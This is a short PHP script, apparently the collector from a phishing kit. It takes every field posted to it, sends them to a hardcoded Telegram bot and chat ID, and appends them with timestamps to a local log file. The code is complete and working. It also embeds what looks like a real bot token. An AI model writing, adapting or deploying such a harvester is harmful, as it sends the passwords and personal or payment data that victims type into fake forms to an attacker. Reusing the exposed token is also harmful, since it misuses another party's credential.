<?php

$chatId = '6762211437';
$botToken = '7939238019:AAEL8ydzii2ttYGrum9IsPDmV5SLfa6bOjg';

// Recopilar los datos en un formato más organizado
$dataReceived = "Datos recibidos:\n\n";
foreach ($_POST as $variable => $value) {
    $dataReceived .= "<b>$variable:</b> $value\n";
}

// URL de la API de Telegram para enviar mensajes
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Datos que se enviarán en la solicitud POST a Telegram
$dataTelegram = [
    'chat_id' => $chatId,
    'text' => $dataReceived,
    'parse_mode' => 'HTML', // Para usar formato HTML en Telegram
];

// Inicializa la sesión cURL para enviar el mensaje a Telegram
$curlTelegram = curl_init($telegramApiUrl);

// Configura las opciones de cURL para la solicitud a Telegram
curl_setopt($curlTelegram, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curlTelegram, CURLOPT_POST, true);
curl_setopt($curlTelegram, CURLOPT_POSTFIELDS, $dataTelegram);

// Realiza la solicitud POST a Telegram
$responseTelegram = curl_exec($curlTelegram);

// Cierra la sesión cURL para Telegram
curl_close($curlTelegram);

// Si se quiere verificar la respuesta de Telegram
// echo $responseTelegram; // Descomenta esta línea para depurar

// Registrar los datos de manera organizada en el archivo de log
$handle = fopen("log.txt", "a");
fwrite($handle, "==============================\n");
foreach ($_POST as $variable => $value) {
    fwrite($handle, "$variable: $value\n");
}
fwrite($handle, "Fecha y Hora: " . date("Y-m-d H:i:s") . "\n");
fwrite($handle, "==============================\n\n\n\n");
fclose($handle);

// Termina el script
exit;
?>
